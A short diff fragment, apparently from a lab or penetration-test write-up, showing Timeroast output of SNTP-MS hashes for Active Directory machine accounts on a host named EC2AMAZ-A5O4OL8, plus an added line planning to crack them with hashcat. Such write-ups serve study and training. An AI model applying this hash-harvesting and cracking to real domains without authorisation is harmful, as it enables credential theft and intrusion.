@@ -169,3 +169,5 @@ TIMEROAST   10.0.16.121     445    EC2AMAZ-A5O4OL8  1116:$sntp-ms$d9e35a96107906
 TIMEROAST   10.0.16.121     445    EC2AMAZ-A5O4OL8  1117:$sntp-ms$50cf909c28a6602c8e08a97fe8a1eeea$1c0111e900000000000a09324c4f434cee11f97683372f41e1b8428bffbfcd0aee1205969f1e7a3eee1205969f1ea282
 ```
 
+Ill place all these in a file and try to crack them with hashcat
+
